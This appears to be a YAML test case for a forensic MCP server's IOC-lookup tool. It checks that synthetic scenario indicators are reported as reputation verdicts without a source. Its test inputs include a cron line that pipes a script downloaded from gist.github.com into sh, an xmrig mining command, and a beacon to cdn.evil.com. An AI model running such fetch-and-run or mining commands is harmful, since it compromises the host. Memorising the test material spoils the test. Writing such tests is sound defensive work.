# Matrix case P4107-007: bulk_ioc_lookup reports verdicts from the bundled
# cache, which holds synthetic entries for the repo's own attack scenarios
# (tag "simulated", source "findevil:scenario-*" / "findevil:synthetic"),
# next to evidence IOCs as if they were reputation results. Domain and hash
# lines carry no source field at all.
# Step 2 uses IOCs common in real Linux intrusions (a payload on
# gist.github.com, a Monero pool): the domain lines get a verdict
# ("legitimate" for the gist host by parent-domain match) with no source.
case_id: P4107-007
problem: P4107
server: findevil
variant: findevil-d1a8d25
commit: d1a8d25d9c8c05bd66881506cb1f12314ee7c5e1
display: response
level: mcp
realism: forced
realism_ko: "1단계 값은 저장소 자체 시나리오에만 있는 IP·도메인·해시라 실제 증거에서 나올 일이 드물고, 응답이 `simulated` 태그를 실어 시험용 자료임을 드러낸다. 2단계는 공개 자료 항목에 출처 칸이 빠진 것만 보여 사례 요지의 결함(합성 자료를 평판처럼 실음)을 직접 보이지 못한다."
coverage: full
summary: For an IP, a domain and a hash taken from evidence, bulk_ioc_lookup marks them attacker_source, c2_server and a known hash from the repo's synthetic scenario cache, and the domain and hash lines carry no source at all, so the model cannot tell these verdicts are test data and not reputation.
summary_ko: "증거에서 뽑은 IP, 도메인, 해시에 대해 bulk_ioc_lookup이 저장소의 합성 시나리오 캐시에서 attacker_source, c2_server, 알려진 해시로 표시하고, 도메인과 해시 줄에는 출처가 전혀 없다. 그래서 모델은 이 판정이 평판이 아니라 테스트 데이터임을 알 수 없다."
defect_ko: "정상이라면 IOC 판정마다 어느 자료에서 왔는지 밝히고 시험용 합성 자료는 평판 판정과 구분해야 하는데, 이 서버는 내장 캐시의 시나리오 항목을 평판 판정처럼 싣고 도메인·해시 줄에는 출처를 싣지 않는다. 그래서 모델은 시험용 판정을 실제 평판으로 잘못 알 수 있다."
setup_ko: "증거 파일 없이, 저장소 시나리오의 IOC가 든 글과 실제 침해에서 흔한 IOC가 든 글을 `bulk_ioc_lookup`에 넣었다."
steps:
  - tool: bulk_ioc_lookup
    note_ko: "결함이 있는 호출: 저장소 시나리오 IOC를 조회"
    args:
      text: "sshd login from 45.123.45.67; beacon to cdn.evil.com; dropped file sha256 9f0f8f4f86a4bbadcd31881e9fab048338aaddaa5501f34b3a3d56a1fa4ba938"
  - tool: bulk_ioc_lookup
    note_ko: "비교용: 실제 침해에서 흔한 도메인을 조회"
    args:
      text: "cron: curl -s https://gist.github.com/u/abc/raw/p.sh | sh; xmrig -o pool.supportxmr.com:443"
expect:
  - step: 1
    note_ko: "시나리오 IP가 `attacker_source`로 판정된다"
    contains: "⚠ `45.123.45.67` — **attacker_source** (tags: ssh_brute_force, interactive_attacker, simulated, confidence: high, source: findevil:scenario-01)"
  - step: 1
    note_ko: "`cdn.evil.com`이 `c2_server`로 판정되고 출처 칸이 없다"
    regex: "(?m)^- ⚠ `cdn\\.evil\\.com` — \\*\\*c2_server\\*\\* \\(tags: [^)]*subdomain_match, confidence: low\\)$"
  - step: 1
    note_ko: "시나리오 해시가 판정 줄로 나오고 출처 칸이 없다"
    regex: "(?m)^- ⚠ `9f0f8f4f86a4bbadcd31881e9fab048338aaddaa5501f34b3a3d56a1fa4ba938` — \\*\\*none\\*\\* \\(family: none, tags: simulated, scenario-01-evidence\\)$"
  - step: 2
    note_ko: "페이로드를 올린 `gist.github.com`이 상위 도메인 일치로 `legitimate`가 되고 출처 칸이 없다"
    regex: "(?m)^- ✓ `gist\\.github\\.com` — \\*\\*legitimate\\*\\* \\(tags: [^)]*subdomain_match, confidence: high\\)$"
  - step: 2
    note_ko: "채굴 풀 도메인이 출처 칸 없이 `mining_pool`로 판정된다"
    regex: "(?m)^- ⚠ `pool\\.supportxmr\\.com` — \\*\\*mining_pool\\*\\* \\(tags: [^)]*, confidence: high\\)$"
